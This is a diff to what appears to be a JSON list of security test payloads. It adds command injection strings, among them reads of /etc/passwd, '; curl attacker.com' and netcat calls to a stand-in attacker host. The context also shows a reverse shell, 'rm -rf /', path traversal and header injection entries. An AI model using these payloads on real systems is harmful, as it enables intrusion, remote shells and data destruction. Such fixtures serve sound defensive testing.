@@ -46,7 +46,17 @@
       "$(whoami)",
       "; rm -rf /",
       "| nc -e /bin/sh attacker.com 4444",
-      "& ping -c 10 127.0.0.1 &"
+      "& ping -c 10 127.0.0.1 &",
+      "` whoami `",
+      "\n cat /etc/passwd",
+      "|| id",
+      "& whoami &",
+      "; id;",
+      "'; exec('whoami'); '",
+      "` id `",
+      "${IFS}cat${IFS}/etc/passwd",
+      "; curl attacker.com",
+      "| nc attacker.com 1234"
     ],
     "path_traversal": [
       "../../../etc/passwd",
@@ -109,7 +119,6 @@
       "\u00A0",
       "\u2003"
     ],
-
     "header_injection": [
       "\\r\\nContent-Length: 0\\r\\n",
       "\\r\\nSet-Cookie: admin=true",
@@ -123,7 +132,7 @@
       "%0aSet-Cookie: admin=true",
       "\\nContent-Length: 0",
       "\\nSet-Cookie: admin=true",
-      ";Content-Length: 0", 
+      ";Content-Length: 0",
       ",Content-Length: 0"
     ]
   },
